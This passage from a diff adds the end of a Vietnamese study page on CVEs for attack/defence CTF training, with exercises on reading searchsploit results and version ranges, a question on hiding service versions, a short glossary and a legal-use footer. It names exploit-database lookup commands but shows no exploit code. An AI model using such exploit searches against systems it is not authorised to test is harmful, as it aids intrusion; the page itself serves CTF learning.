+  vẫn hiện kết quả cũ nhưng exploit đó KHÔNG còn áp dụng được — luyện kỹ năng đọc "Disclosure Date"/affected
+  version range trong kết quả.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>./searchsploit -x &lt;EDB-ID&gt;</code> thường ghi rõ
+  "Vulnerable App" và version range ngay đầu file — đọc kỹ trước khi thử.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> giải thích vì sao trong 1 trận A/D thật, việc GIẤU thông tin version (mục
+  10) lại đặc biệt quan trọng hơn so với 1 web bình thường ngoài đời — liên hệ tới việc ĐỐI THỦ của bạn cũng
+  đang quét CVE trên CHÍNH SERVICE CỦA BẠN.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Trong A/D, mọi đội chạy CÙNG 1 bản service — nếu đối thủ xác định
+  được version nhanh hơn bạn fix/giấu, họ áp dụng CVE lên TOÀN BỘ service của mọi đội khác cùng lúc (không chỉ
+  của bạn), nên việc giấu version giúp làm chậm, không phải chặn hoàn toàn.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>CVE</td><td>Mã định danh công khai cho 1 lỗ hổng đã biết trong 1 phần mềm cụ thể.</td></tr>
+    <tr><td>CVSS</td><td>Điểm số 0-10 đánh giá mức độ nghiêm trọng của CVE.</td></tr>
+    <tr><td>PoC</td><td>Mã khai thác mẫu công khai cho 1 CVE, thường cần chỉnh sửa để khớp target thật.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ offline:</strong> <code>~/hoc/CTF/Tools/web/exploitdb/</code> (chạy
+  <code>./searchsploit -u</code> để cập nhật database nếu còn Internet trước ngày thi).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("cve-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("cve-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
